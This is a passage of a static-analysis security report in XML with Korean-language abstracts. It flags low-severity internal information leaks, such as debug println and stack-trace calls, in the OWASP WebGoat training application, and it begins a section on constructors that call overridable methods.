<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>540</LineStart>
<Snippet>		+ "TEST 7:ExecTimeout process waits for input");
	results = Exec.execTimeout("c:/swarm-2.1.1/bin/cat", 5 * 1000);
	System.out.println(results);
    }
}</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>433</LineStart>
<Snippet>	catch (Throwable t)
	{
	    results.setThrowable(t);
	}
	finally</Snippet>
<TargetFunction>Read t()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7D7642FD9165C555C10F036C0408C0A6" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SqlStringInjection.java의 handleRequest() 함수는 316 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SqlStringInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlStringInjection.java</FilePath>
<LineStart>316</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println("Exception caught: " + e);
	    e.printStackTrace(System.out);
	}</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SqlStringInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlStringInjection.java</FilePath>
<LineStart>316</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println("Exception caught: " + e);
	    e.printStackTrace(System.out);
	}</Snippet>
<TargetFunction>Read e()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1729F6491B3D6B03B27E75558A009D38" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 dumpSession() 함수는 246 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>246</LineStart>
<Snippet>	    Object value = session.getAttribute(name);
	    System.out.println("Name: " + name);
	    System.out.println("Value: " + value);
	}
    }</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Course.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Course.java</FilePath>
<LineStart>326</LineStart>
<Snippet>    private void loadFiles(ServletContext context, String path)
    {
    	Set resourcePaths = context.getResourcePaths(path);
    	Iterator itr = resourcePaths.iterator();
    	</Snippet>
<TargetFunction>javax.servlet.ServletContext.getResourcePaths()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9EE0B7A443146B20F55DEE3883385554" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>BlindSqlInjection.java의 handleRequest() 함수는 343 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>BlindSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BlindSqlInjection.java</FilePath>
<LineStart>343</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println("Exception caught: " + e);
	    e.printStackTrace(System.out);
	}</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>BlindSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BlindSqlInjection.java</FilePath>
<LineStart>343</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println("Exception caught: " + e);
	    e.printStackTrace(System.out);
	}</Snippet>
<TargetFunction>Read e()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="159D205600BB0BD92FC54008D21A504F" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 532 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>532</LineStart>
<Snippet>		+ "TEST 5:execLazy");
	results = Exec.execLazy("ping -t 127.0.0.1");
	System.out.println(results);
	System.out.println("-------------------------------------------" + sep
		+ "TEST 6:ExecTimeout process never outputs");</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>433</LineStart>
<Snippet>	catch (Throwable t)
	{
	    results.setThrowable(t);
	}
	finally</Snippet>
<TargetFunction>Read t()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="159D205600BB0BD92FC54008D21A504D" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 524 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>524</LineStart>
<Snippet>	results = Exec.execInput("find \"cde\"",
		"abcdefg1\nhijklmnop\nqrstuv\nabcdefg2");
	System.out.println(results);
	System.out.println("-------------------------------------------" + sep
		+ "TEST 4:execTimeout");</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>433</LineStart>
<Snippet>	catch (Throwable t)
	{
	    results.setThrowable(t);
	}
	finally</Snippet>
<TargetFunction>Read t()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1E98A6F7A122158FAD7179B0502E34B1" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>AbstractLesson.java의 getFileText() 함수는 478 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>478</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println(e);
	    e.printStackTrace();
	}</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>478</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println(e);
	    e.printStackTrace();
	}</Snippet>
<TargetFunction>Read e()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9396649AA679C28481D5964BA5420B58" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ThreadSafetyProblem.java의 handleRequest() 함수는 216 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ThreadSafetyProblem.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ThreadSafetyProblem.java</FilePath>
<LineStart>216</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println("Exception caught: " + e);
	    e.printStackTrace(System.out);
	}</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ThreadSafetyProblem.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ThreadSafetyProblem.java</FilePath>
<LineStart>216</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println("Exception caught: " + e);
	    e.printStackTrace(System.out);
	}</Snippet>
<TargetFunction>Read e()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F22C243B557C399BA5F12578F4B9E012" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SqlNumericInjection.java의 handleRequest() 함수는 400 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SqlNumericInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlNumericInjection.java</FilePath>
<LineStart>400</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println("Exception caught: " + e);
	    e.printStackTrace(System.out);
	}</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SqlNumericInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlNumericInjection.java</FilePath>
<LineStart>400</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println("Exception caught: " + e);
	    e.printStackTrace(System.out);
	}</Snippet>
<TargetFunction>Read e()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="159D205600BB0BD92FC54008D21A5050" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 536 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>536</LineStart>
<Snippet>		+ "TEST 6:ExecTimeout process never outputs");
	results = Exec.execTimeout("c:/swarm-2.1.1/bin/sleep.exe 20", 5 * 1000);
	System.out.println(results);
	System.out.println("-------------------------------------------" + sep
		+ "TEST 7:ExecTimeout process waits for input");</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>433</LineStart>
<Snippet>	catch (Throwable t)
	{
	    results.setThrowable(t);
	}
	finally</Snippet>
<TargetFunction>Read t()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="22527F24D3F8FE925A856B7C8B72C8B7" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 536 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>536</LineStart>
<Snippet>		+ "TEST 6:ExecTimeout process never outputs");
	results = Exec.execTimeout("c:/swarm-2.1.1/bin/sleep.exe 20", 5 * 1000);
	System.out.println(results);
	System.out.println("-------------------------------------------" + sep
		+ "TEST 7:ExecTimeout process waits for input");</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>403</LineStart>
<Snippet>	    catch (IOException e3)
	    {
		results.setThrowable(e3);
	    }
	    finally</Snippet>
<TargetFunction>Read e3()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="22527F24D3F8FE925A856B7C8B72C8B5" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 528 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>528</LineStart>
<Snippet>		+ "TEST 4:execTimeout");
	results = Exec.execTimeout("ping -t 127.0.0.1", 5 * 1000);
	System.out.println(results);
	System.out.println("-------------------------------------------" + sep
		+ "TEST 5:execLazy");</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>403</LineStart>
<Snippet>	    catch (IOException e3)
	    {
		results.setThrowable(e3);
	    }
	    finally</Snippet>
<TargetFunction>Read e3()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="63B451D8A2A6D70B0E55D1795D455FAF" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>AbstractLesson.java의 readFromURL() 함수는 1044 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>1044</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println(e);
	    e.printStackTrace();
	}</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>1044</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println(e);
	    e.printStackTrace();
	}</Snippet>
<TargetFunction>Read e()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AB4E42C5163F2C47C0CE0592AD5E896C" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 log() 함수는 307 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>307</LineStart>
<Snippet>		+ request.getRemoteAddr() + " | " + message;
	log(output);
	System.out.println(output);
    }
</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>LessonSource.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/LessonSource.java</FilePath>
<LineStart>106</LineStart>
<Snippet>		thr.printStackTrace();
		log(request, "Could not write error screen: "
			+ thr.getMessage());
	    }
	    //System.out.println( "Leaving doPost: " );</Snippet>
<TargetFunction>java.lang.Throwable.getMessage()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D1BF871BD67B399815A6110FA943DC60" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>WebSession.java의 getDatabaseConnectionString() 함수는 441 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>441</LineStart>
<Snippet>			System.out.println( "PATH: " + path );
			String realConnectionString = databaseConnectionString.replaceAll( "PATH", path );
			System.out.println( "Database Connection String: " + realConnectionString );

			return realConnectionString;</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>438</LineStart>
<Snippet>		try
		{
			String path = context.getRealPath( "/database" ).replace( '\\', '/' );
			System.out.println( "PATH: " + path );
			String realConnectionString = databaseConnectionString.replaceAll( "PATH", path );</Snippet>
<TargetFunction>javax.servlet.ServletContext.getRealPath()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F82BAB3CD0F3C4174E4E45AD5A4AC744" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 509 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>509</LineStart>
<Snippet>		+ "TEST 1: execSimple");
	results = Exec.execSimple("c:/swarm-2.1.1/bin/whoami.exe");
	System.out.println(results);
	System.out.println("-------------------------------------------" + sep
		+ "TEST 2: execSimple (with search)");</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>357</LineStart>
<Snippet>	    catch (IOException e2)
	    {
		results.setThrowable(e2);
	    }
	    finally</Snippet>
<TargetFunction>Read e2()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A442B6350AC6E369A724F565263FE717" ruleID="9AB0476C-1D90-40DE-B4EA-C1420A8AC2F0">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 log() 함수는 306 줄의 log()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. log()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>306</LineStart>
<Snippet>	String output = new Date() + " | " + request.getRemoteHost() + ":"
		+ request.getRemoteAddr() + " | " + message;
	log(output);
	System.out.println(output);
    }</Snippet>
<TargetFunction>javax.servlet.GenericServlet.log()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>LessonSource.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/LessonSource.java</FilePath>
<LineStart>106</LineStart>
<Snippet>		thr.printStackTrace();
		log(request, "Could not write error screen: "
			+ thr.getMessage());
	    }
	    //System.out.println( "Leaving doPost: " );</Snippet>
<TargetFunction>java.lang.Throwable.getMessage()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F82BAB3CD0F3C4174E4E45AD5A4AC745" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 513 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>513</LineStart>
<Snippet>		+ "TEST 2: execSimple (with search)");
	results = Exec.execSimple("netstat -r");
	System.out.println(results);

	if (results.outputContains("localhost:1031"))</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>357</LineStart>
<Snippet>	    catch (IOException e2)
	    {
		results.setThrowable(e2);
	    }
	    finally</Snippet>
<TargetFunction>Read e2()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="07DC81F1724D3DD1F052EE4103383C32" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 524 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>524</LineStart>
<Snippet>	results = Exec.execInput("find \"cde\"",
		"abcdefg1\nhijklmnop\nqrstuv\nabcdefg2");
	System.out.println(results);
	System.out.println("-------------------------------------------" + sep
		+ "TEST 4:execTimeout");</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>317</LineStart>
<Snippet>		catch (IOException e1)
		{
		    results.setThrowable(e1);
		}
	    }</Snippet>
<TargetFunction>Read e1()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="536AD1F9902988E88A35C504919667FC" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ErrorScreen.java의 createContent() 함수는 159 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ErrorScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ErrorScreen.java</FilePath>
<LineStart>159</LineStart>
<Snippet>	protected Element createContent( WebSession s )
	{
		System.out.println( "errorscreen createContent Error:" + this.error + " message:" + this.message );

		Element content;</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>194</LineStart>
<Snippet>	    t.printStackTrace();
	    log("ERROR: " + t);
	    screen = new ErrorScreen(mySession, t);
	}
	finally</Snippet>
<TargetFunction>Read t()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="07DC81F1724D3DD1F052EE4103383C31" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 513 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>513</LineStart>
<Snippet>		+ "TEST 2: execSimple (with search)");
	results = Exec.execSimple("netstat -r");
	System.out.println(results);

	if (results.outputContains("localhost:1031"))</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>317</LineStart>
<Snippet>		catch (IOException e1)
		{
		    results.setThrowable(e1);
		}
	    }</Snippet>
<TargetFunction>Read e1()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="159D205600BB0BD92FC54008D21A504E" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 528 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>528</LineStart>
<Snippet>		+ "TEST 4:execTimeout");
	results = Exec.execTimeout("ping -t 127.0.0.1", 5 * 1000);
	System.out.println(results);
	System.out.println("-------------------------------------------" + sep
		+ "TEST 5:execLazy");</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>433</LineStart>
<Snippet>	catch (Throwable t)
	{
	    results.setThrowable(t);
	}
	finally</Snippet>
<TargetFunction>Read t()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="07DC81F1724D3DD1F052EE4103383C34" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 532 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>532</LineStart>
<Snippet>		+ "TEST 5:execLazy");
	results = Exec.execLazy("ping -t 127.0.0.1");
	System.out.println(results);
	System.out.println("-------------------------------------------" + sep
		+ "TEST 6:ExecTimeout process never outputs");</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>317</LineStart>
<Snippet>		catch (IOException e1)
		{
		    results.setThrowable(e1);
		}
	    }</Snippet>
<TargetFunction>Read e1()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="50">
                        <groupTitle>Code Correctness: Constructor Invokes Overridable Function</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>CrossSiteScripting.java의 157 줄에서 CrossSiteScripting의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>생성자가 오버라이드 가능 함수를 호출하면 공격자는 개체가 완전히 초기화되기 전에 this 참조에 접근할 수 있으므로 취약점이 발생할 수 있습니다.

예제 1: 다음 코드는 오버라이드 가능한 메서드를 호출합니다.


  ...
  class User {
    private String username;
    private boolean valid;
    public User(String username, String password){
      this.username = username;
      this.valid = validateUser(username, password);
    }
    public boolean validateUser(String username, String password){
      //validate user is real and can authenticate
      ...
    }
    public final boolean isValid(){
      return valid;
    }
  }


